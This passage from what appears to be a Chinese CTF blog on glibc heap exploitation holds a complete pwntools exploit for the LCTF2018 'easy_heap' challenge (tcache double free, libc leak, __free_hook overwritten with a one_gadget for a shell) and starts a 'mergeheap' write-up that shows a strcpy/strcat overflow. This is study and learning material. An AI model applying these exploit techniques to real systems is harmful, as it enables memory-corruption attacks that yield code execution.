chunk-7</span></span><br><span class="line"></span><br><span class="line">puts(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这时候我们puts(0)就可以泄露了，</p>
<h4 id="后面简单的double-free"><a href="#后面简单的double-free" class="headerlink" title="后面简单的double free"></a>后面简单的double free</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">libc_leak = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"libc_leak: 0x%x"</span> % libc_leak)</span><br><span class="line">libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">malloc(<span class="number">0x10</span>, str(<span class="number">0x9</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap</span></span><br><span class="line"><span class="comment"># chunk-1 </span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-8 </span></span><br><span class="line"><span class="comment"># chunk-0 chunk-9</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chunk-7</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#bypass the tcache count check</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f2c5</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span><span class="comment"># 0x10a38c</span></span><br><span class="line">malloc(<span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">malloc(<span class="number">0x10</span>, <span class="string">'/bin/sh;#'</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line">io.success(<span class="string">"free_hook: 0x%x"</span> % free_hook)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这里有个注意的地方，free(1)这里看好</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4194</span>    ------------------------------ <span class="built_in">free</span> ------------------------------</span><br><span class="line"><span class="number">4195</span>  */</span><br><span class="line"><span class="number">4196</span> </span><br><span class="line"><span class="number">4197</span> <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line"><span class="number">4198</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line"><span class="number">4199</span> &#123;</span><br><span class="line"><span class="number">4200</span>   INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line"><span class="number">4201</span>   mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line"><span class="number">4202</span>   mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line"><span class="number">4203</span>   INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line"><span class="number">4204</span>   <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line"><span class="number">4205</span>   INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line"><span class="number">4206</span>   mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"><span class="number">4207</span>   mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"><span class="number">4208</span> </span><br><span class="line"><span class="number">4209</span>   size = chunksize (p);</span><br><span class="line"><span class="number">4210</span> </span><br><span class="line"><span class="number">4211</span>   <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">4212      allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">4213      Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">4214      here by accident or by "design" from some intruder.  */</span></span><br><span class="line"><span class="number">4215</span>   <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line"><span class="number">4216</span>       || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line"><span class="number">4217</span>     malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"><span class="number">4218</span>   <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">4219      multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="number">4220</span>   <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line"><span class="number">4221</span>     malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"><span class="number">4222</span> </span><br><span class="line"><span class="number">4223</span>   check_inuse_chunk(av, p);</span><br><span class="line"><span class="number">4224</span> </span><br><span class="line"><span class="number">4225</span> <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="number">4226</span>   &#123;</span><br><span class="line"><span class="number">4227</span>     <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"><span class="number">4228</span> </span><br><span class="line"><span class="number">4229</span>     <span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line"><span class="number">4230</span>     tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"><span class="number">4231</span> </span><br><span class="line"><span class="number">4232</span>     <span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">4233        trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">4234        2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence</span></span><br><span class="line"><span class="comment">4235        before aborting.  */</span></span><br><span class="line"><span class="number">4236</span>     <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span><br><span class="line"><span class="number">4237</span>       &#123;</span><br><span class="line"><span class="number">4238</span>         tcache_entry *tmp;</span><br><span class="line"><span class="number">4239</span>         LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line"><span class="number">4240</span>         <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"><span class="number">4241</span>              tmp;</span><br><span class="line"><span class="number">4242</span>              tmp = tmp-&gt;next)</span><br><span class="line"><span class="number">4243</span>           <span class="keyword">if</span> (tmp == e)</span><br><span class="line"><span class="number">4244</span>             malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line"><span class="number">4245</span>         <span class="comment">/* If we get here, it was a coincidence.  We've wasted a few</span></span><br><span class="line"><span class="comment">4246            cycles, but don't abort.  */</span></span><br><span class="line"><span class="number">4247</span>       &#125;</span><br><span class="line"><span class="number">4248</span> </span><br><span class="line"><span class="number">4249</span>     <span class="keyword">if</span> (tcache</span><br><span class="line"><span class="number">4250</span>         &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line"><span class="number">4251</span>         &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line"><span class="number">4252</span>       &#123;</span><br><span class="line"><span class="number">4253</span>         tcache_put (p, tc_idx);</span><br><span class="line"><span class="number">4254</span>         <span class="keyword">return</span>;</span><br><span class="line"><span class="number">4255</span>       &#125;</span><br><span class="line"><span class="number">4256</span>   &#125;</span><br><span class="line"><span class="number">4257</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>源码在最后一部分检查了tcache的数量，所以free的时候得使tcache的数量对的上。</p>
<p>说多了都是泪，简单题做着不简单，花了好长时间</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/NoOne/Documents/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#功能性测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    malloc(<span class="number">0x20</span>, <span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    puts(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">9</span>) <span class="comment">#tcache for avoid top chunk consolidate</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># tcache-0</span></span><br><span class="line">    <span class="comment"># tcache-1</span></span><br><span class="line">    <span class="comment"># tcache-2</span></span><br><span class="line">    <span class="comment"># tcache-3</span></span><br><span class="line">    <span class="comment"># tcache-4</span></span><br><span class="line">    <span class="comment"># tcache-5</span></span><br><span class="line">    <span class="comment"># unsorted - 6</span></span><br><span class="line">    <span class="comment"># unsorted - 7</span></span><br><span class="line">    <span class="comment"># unsorted - 8</span></span><br><span class="line">    <span class="comment"># tcache-9</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-1</span></span><br><span class="line">    <span class="comment"># chunk - 7</span></span><br><span class="line">    <span class="comment"># chunk - 8</span></span><br><span class="line">    <span class="comment"># chunk - 9</span></span><br><span class="line">    <span class="comment"># chunk-0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># now chunk -9's pre_size is 0x200</span></span><br><span class="line">    malloc(<span class="number">0xf8</span>, str(<span class="number">8</span>)*<span class="number">0x7</span>) <span class="comment">#off-by-one change chunk9's insue</span></span><br><span class="line">    free(<span class="number">6</span>) <span class="comment"># free into tcache, so we can use unsortbin consolidate</span></span><br><span class="line">    free(<span class="number">9</span>) <span class="comment"># unsortbin consolidate</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># chunk-6   tcache</span></span><br><span class="line">    <span class="comment"># chunk-5   tcache</span></span><br><span class="line">    <span class="comment"># chunk-4   tcache</span></span><br><span class="line">    <span class="comment"># chunk-3   tcache</span></span><br><span class="line">    <span class="comment"># chunk-2   tcache</span></span><br><span class="line">    <span class="comment"># chunk-1   tcache</span></span><br><span class="line">    <span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line">    <span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line">    <span class="comment"># chunk - 9 unsorted</span></span><br><span class="line">    <span class="comment"># chunk-0   tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">1</span>)*<span class="number">0x7</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(<span class="number">0x8</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap</span></span><br><span class="line">    <span class="comment"># chunk-1 </span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-8 </span></span><br><span class="line">    <span class="comment"># chunk-0</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># chunk-7</span></span><br><span class="line"></span><br><span class="line">    puts(<span class="number">0</span>)</span><br><span class="line">    libc_leak = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"libc_leak: 0x%x"</span> % libc_leak)</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    malloc(<span class="number">0x10</span>, str(<span class="number">0x9</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now the heap</span></span><br><span class="line">    <span class="comment"># chunk-1 </span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-8 </span></span><br><span class="line">    <span class="comment"># chunk-0 chunk-9</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># chunk-7</span></span><br><span class="line">    free(<span class="number">1</span>) <span class="comment">#bypass the tcache count check</span></span><br><span class="line">    free(<span class="number">0</span>) </span><br><span class="line">    free(<span class="number">9</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f2c5</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f322</span><span class="comment"># 0x10a38c</span></span><br><span class="line">    malloc(<span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">    malloc(<span class="number">0x10</span>, <span class="string">'/bin/sh;#'</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line">    io.success(<span class="string">"free_hook: 0x%x"</span> % free_hook)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h2><p>vmmap 这个命令可以指定具体想要查看的内容，比如</p>
<ol>
<li>vmmap libc</li>
<li>vmmap heap</li>
<li>vmmap stack</li>
<li>vmmap map</li>
</ol>
<p>tcache是FILO,跟栈是类似的</p>
<p>patchelf 可以指定版本libc, 这样可以调试带符号的libc，加上glibc-all-in-one这个项目或者自己去下载glibc就可以用pwndbg的那些heap  bins等命令了<br>具体如下：<br>patchelf –set-interpreter libc目录/ld-2.27.so –set-rpath libc目录 文件名</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>加入tcache后攻击方法变得相对简单，堆块的申请却变得复杂了，因为在leak的时候要考虑tcache，以及构造的时候也要考虑tcache</li>
<li>我觉得不需要跟我一样标注出每个堆块的位置，我只是学习tcache，所以标注出来方便自己看</li>
<li>堆块重用这部分经常都是跟off-by-one结合起来</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-1-lctf2018-pwn-easy_heap" target="_blank" rel="noopener">ctf-wiki</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-heap-learn-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-heap-learn-6/" itemprop="url">pwn/pwn-heap-learn-6</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn堆入门系列教程6"><a href="#pwn堆入门系列教程6" class="headerlink" title="pwn堆入门系列教程6"></a>pwn堆入门系列教程6</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a><br><a href="https://xz.aliyun.com/t/6377" target="_blank" rel="noopener">pwn堆入门系列教程5</a></p>
<p>要将别人的东西转化成自己的东西，还是得实操，自己去操作番才可以得到些东西，学了这么久，这几天的比赛也算是用上了，有unlink，有double free，这些操作用上了</p>
<h2 id="2019护网杯-mergeheap"><a href="#2019护网杯-mergeheap" class="headerlink" title="2019护网杯 mergeheap"></a>2019护网杯 mergeheap</h2><p>我每次看到题目名字跟函数名字相同，我就知道点就在那个函数上，然而我当时已经看出这里有溢出了，然后调试的时候以为没覆盖到，原来只能覆盖到size，还是脑子不清晰，所以才会这样</p>
<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>新建一个堆块</li>
<li>展示堆块内容</li>
<li>删除一个堆块</li>
<li>合并两个堆块内容</li>
<li>退出</li>
</ol>
<p>乍一看就只有合并比较可疑了，通常堆题没合并，而题目又是mergeheap</p>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_E29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">14</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx1:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">14</span> || !qword_2020A0[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx2:"</span>);</span><br><span class="line">  v3 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">14</span> || !qword_2020A0[v3] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  v4 = dword_202060[v2] + dword_202060[v3];</span><br><span class="line">  qword_2020A0[i] = <span class="built_in">malloc</span>(v4);</span><br><span class="line">  <span class="built_in">strcpy</span>(qword_2020A0[i], qword_2020A0[v2]);</span><br><span class="line">  <span class="built_in">strcat</span>(qword_2020A0[i], qword_2020A0[v3]);</span><br><span class="line">  dword_202060[i] = v4;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>merge这里的strcpy跟strcat都是遇到\x00结束的，所以，我们如果将下一个堆块的pre_size当数据段来用的话，就可以复制到size部分，merge的时候会覆盖到下一个堆块的size，溢出覆盖size</p>
